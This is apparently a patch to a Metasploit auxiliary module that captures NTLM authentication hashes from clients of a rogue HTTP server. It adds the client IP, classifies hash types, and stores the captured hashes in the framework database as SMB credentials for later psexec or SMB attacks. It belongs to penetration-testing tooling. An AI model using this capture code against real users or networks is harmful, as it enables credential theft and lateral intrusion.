@@ -154,7 +154,7 @@ class Metasploit3 < Msf::Auxiliary
 			arg[:host] = host
 			arg[:user] = user
 			arg[:domain] = domain
-
+			arg[:ip] = cli.peerhost
 			html_get_hash(arg)
 
 			response = create_response(200)
@@ -203,6 +203,7 @@ class Metasploit3 < Msf::Auxiliary
 		domain = arg[:domain]
 		user = arg[:user]
 		host = arg[:host]
+		ip = arg[:ip]
 		
 		unless @previous_lm_hash == lm_hash and @previous_ntlm_hash == nt_hash then
 
@@ -268,11 +269,13 @@ class Metasploit3 < Msf::Auxiliary
 			capturedtime = Time.now.to_s
 			case ntlm_ver
 			when NTLM_CONST::NTLM_V1_RESPONSE
+				smb_db_type_hash = "smb_netv1_hash"
 				capturelogmessage =
 					"#{capturedtime}\nNTLMv1 Response Captured from #{host} \n" +
 					"DOMAIN: #{domain} USER: #{user} \n" +
 					"LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
 			when NTLM_CONST::NTLM_V2_RESPONSE
+				smb_db_type_hash = "smb_netv2_hash"
 				capturelogmessage =
 					"#{capturedtime}\nNTLMv2 Response Captured from #{host} \n" +
 					"DOMAIN: #{domain} USER: #{user} \n" +
@@ -281,6 +284,9 @@ class Metasploit3 < Msf::Auxiliary
 					"NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
 					"NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
 			when NTLM_CONST::NTLM_2_SESSION_RESPONSE
+				#we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
+				#also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
+				smb_db_type_hash = "smb_netv1_hash"
 				capturelogmessage =
 					"#{capturedtime}\nNTLM2_SESSION Response Captured from #{host} \n" +
 					"DOMAIN: #{domain} USER: #{user} \n" +
@@ -293,6 +299,22 @@ class Metasploit3 < Msf::Auxiliary
 
 			print_status(capturelogmessage)
 
+			# DB reporting
+			# Rem :  one report it as a smb_challenge on port 445 has breaking those hashes 
+			# will be mainly use for psexec / smb related exploit
+			report_auth_info(
+				:host  => ip,
+				:port => 445,
+				:sname => 'smb_challenge',
+				:user => user,
+				:pass => domain + ":" +
+					( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "00" * 24 ) + ":" +
+					( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s :  "00" * 24 ) + ":" +
+					datastore['CHALLENGE'].to_s,
+				:type => smb_db_type_hash,
+				:proof => "DOMAIN=#{domain}",
+				:active => true
+			)
 			#if(datastore['LOGFILE'])
 			#	File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
 			#end
